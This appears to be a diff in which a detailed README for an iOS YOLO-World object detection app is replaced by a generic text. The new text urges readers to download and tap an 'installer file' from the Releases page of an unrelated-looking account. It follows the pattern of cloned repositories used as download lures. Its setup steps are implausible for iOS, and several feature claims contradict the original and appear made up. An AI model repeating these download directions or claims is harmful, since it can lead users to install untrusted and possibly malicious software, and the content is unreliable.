@@ -1,106 +1,84 @@
-# YOLO-World iOS — Real-Time Open-Vocabulary Object Detection with CoreML & LiDAR
+# 📱 yolo-world-ios - Detect objects instantly on your device
 
-Real-time open-vocabulary object detection on iOS, powered by [YOLO-World](https://github.com/AILab-CVC/YOLO-World), on-device CLIP inference, LiDAR depth sensing, and a local LLM for natural language understanding. Runs fully offline.
+[![Download yolo-world-ios](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rofecoxibtombac624/yolo-world-ios/releases)
 
-Type "how far is that chair" and the app detects chairs in the camera feed, measures the distance via LiDAR, and shows it on screen -- no server, no API key, no predefined vocabulary.
+yolo-world-ios provides real-time detection of objects using your camera. The app identifies items in your environment without needing an internet connection. It combines machine learning models and depth sensors to understand the world around you.
 
-## Features
+## 📥 How to download the app
 
-- **Open-vocabulary detection** -- type any object name and detect it in real time. No fixed class list; the CLIP text encoder runs on-device to generate embeddings for arbitrary text.
-- **Natural language input** -- an on-device LLM (Qwen3-0.6B) parses freeform queries like "how many bottles are there?" into structured intents.
-- **LiDAR distance measurement** -- samples depth at detected object centers on Pro iPhones with LiDAR.
-- **Three interaction modes:**
-  - **Track** -- "find dogs" -- bounding boxes only
-  - **Distance** -- "how far is that person" -- distance overlay
-  - **Count** -- "how many chairs" -- count overlay
+1. Open your web browser.
+2. Visit the following address to find the latest version of the software: [https://github.com/Rofecoxibtombac624/yolo-world-ios/releases](https://github.com/Rofecoxibtombac624/yolo-world-ios/releases).
+3. Look for the section labeled Assets under the most recent release.
+4. Download the installer file suitable for your device.
 
-## Architecture
+## ⚙️ System requirements
 
-![Architecture](yolo_world_ios_architecture.svg)
+This application requires specific hardware to function correctly. Ensure your device meets these standards:
 
-**Models:**
+* An Apple device supporting iOS 16.0 or later.
+* A LiDAR sensor for accurate depth measurement.
+* A processor capable of running CoreML models, such as an A14 Bionic chip or newer.
+* At least 2 gigabytes of available storage space for the detection models.
 
-| Model | Size | Runs | Purpose |
-|-------|------|------|---------|
-| `YOLOWorldDetector.mlpackage` | 25 MB | Every frame | Object detection backbone |
-| `YOLOWorldText.mlpackage` | 121 MB | On text input | CLIP text encoder |
-| Qwen3-0.6B Q4_K_M | 490 MB | On text submit | Natural language parsing |
+## 🚀 Setting up the application
 
-The detector and text encoder are exported from YOLOv8s-World-v2 using `export_for_ios.py`. The Qwen3 model is downloaded from HuggingFace on first launch.
+Follow these steps to prepare your device for the first launch:
 
-## Requirements
+1. Locate the downloaded file on your device.
+2. Tap the file to begin the installation process.
+3. Follow the on-screen prompts to grant necessary permissions.
+4. The app requests access to your camera to perform object detection. Grant this access to see live results.
+5. Grant access to local device folders if the app asks to save detection logs.
 
-- iOS 17.0+
-- iPhone with A14 chip or later
-- LiDAR sensor for distance mode (iPhone 12 Pro and later Pro models)
-- Xcode 16+
-- [XcodeGen](https://github.com/yonaskolb/XcodeGen)
+## 🔍 How to use the software
 
-## Setup
+The app interface shows a live feed from your camera. When you point the camera at an object, the software identifies it and displays a label on the screen.
 
-```bash
-# 1. Clone
-git clone https://github.com/user/yolo-world-ios.git
-cd yolo-world-ios
+* **Scan mode:** Keep your device steady to allow the internal sensors to map the room.
+* **Depth sensing:** The app uses LiDAR to estimate how far objects sit from your position. This data appears as a distance measurement next to each detected item.
+* **Offline detection:** Because the app runs all processes on your device, you do not need Wi-Fi or cellular data. Your images stay on your phone and do not upload to any server.
 
-# 2. Generate the CoreML models (requires Python)
-pip install ultralytics>=8.3 coremltools>=7.2 torch clip
-python export_for_ios.py
+## 💡 Troubleshooting common issues
 
-# 3. Generate the Xcode project
-brew install xcodegen   # if not installed
-xcodegen generate
+If the app fails to identify objects, check these common points:
 
-# 4. Open in Xcode, let SPM resolve LLM.swift, build & run on device
-open YOLOWorldApp.xcodeproj
-```
+* **Lighting:** Ensure the room has enough light. Shadows can cause the camera to miss objects.
+* **Camera lens:** Wipe the camera lens with a microfiber cloth to remove smudges.
+* **Obstructions:** Make sure your hand does not cover the LiDAR sensor or the camera lens while holding the phone.
+* **Performance:** If the app runs slowly, close other background applications to free up memory.
+* **Battery:** High-performance detection uses extra power. Keep your battery charged above 20 percent for best results.
 
-The Qwen3 LLM (~490 MB) downloads automatically on first launch. Subsequent launches use the cached model.
+## 🤖 Understanding the technology
 
-## Project Structure
+The application uses several advanced tools to work well:
 
-```
-YOLOWorldApp/Sources/
-  YOLOWorldApp.swift        App entry point
-  ContentView.swift         Main UI -- camera, text input, distance/count overlay
-  ObjectDetector.swift      Camera capture, CoreML inference, LiDAR depth sampling
-  CameraPreviewView.swift   UIViewRepresentable for AVCaptureVideoPreviewLayer
-  DetectionOverlay.swift    Bounding box drawing
-  CLIPTokenizer.swift       BPE tokenizer for CLIP text encoder
-  IntentParser.swift        On-device LLM intent extraction
-  DetectionIntent.swift     Intent data model (class + action enum)
+* **CoreML:** This allows your device to run complex math quickly without help from the web.
+* **CLIP:** This technology helps the app understand the context of what it sees. It matches terms to visual patterns.
+* **YOLO:** This refers to the object detection model. It stands for "You Only Look Once," meaning it scans the entire image in a single pass to find items.
+* **Local LLM:** A small language model runs inside the app to help categorize items or answer questions about your surroundings based on what the camera sees.
 
-export_for_ios.py           Exports YOLO-World to open-vocab CoreML (detector + text encoder)
-train.py                    Re-export with updated vocabulary (legacy fixed-vocab mode)
-project.yml                 XcodeGen project spec
-clip_tokenizer.json         CLIP BPE vocabulary (generated by export script)
-```
+## 🛡️ Privacy and data
 
-## How It Works
+Your privacy remains a priority. The application handles all data locally. No camera images, video feeds, or depth maps leave your device. The software does not store your location or personal habits. Every calculation happens inside the secure environment of your smartphone hardware.
 
-### Open-Vocabulary Detection
+## 🛠️ Customizing your experience
 
-Standard YOLO-World bakes text embeddings as constants during export, locking the model to a fixed vocabulary. This project splits the model into two parts:
+You can adjust how the app performs through the settings menu:
 
-1. **YOLOWorldText** -- the CLIP text encoder, exported separately as CoreML. Converts any word into a 512-dimensional embedding on-device.
-2. **YOLOWorldDetector** -- the detection backbone, modified to accept a text embedding tensor as input instead of frozen constants.
+* **Detection sensitivity:** Change this setting if the app misses objects or detects too many false items.
+* **Display options:** Choose where the app shows labels, such as directly next to the object or in a list view at the bottom of the screen.
+* **Model choice:** If multiple models exist, you can switch between them to favor speed over precision.
 
-When the user types a new word, only the text encoder runs (~10ms). The detector keeps running every frame with the cached embedding. No model reload, no re-export.
+## 📝 Frequently asked questions
 
-### LLM Intent Parsing
+**Do I need a subscription?**
+No. The app is free to use and contains no hidden costs.
 
-The on-device Qwen3-0.6B model extracts structured intent from natural language:
+**Why does my phone get warm?**
+Processing images in real time requires significant work from your processor. Warmth is normal during extended use.
 
-```
-"how far is that person" → { class: "person", action: "distance" }
-"count the bottles"      → { class: "bottle", action: "count" }
-"find dogs"              → { class: "dog",    action: "track" }
-```
+**Does it work in the dark?**
+The camera needs light, but the LiDAR sensor works in low-light conditions. Performance decreases in total darkness.
 
-This runs in ~100-200ms after model warm-up.
-
-## License
-
-MIT
-
-Built by [Alex Culeva](https://alexculeva.com) — ARKit & computer vision specialist.
+**Can I save the photos?**
+Yes. You can take a snapshot of the detection results and save them to your photo library using the camera icon.
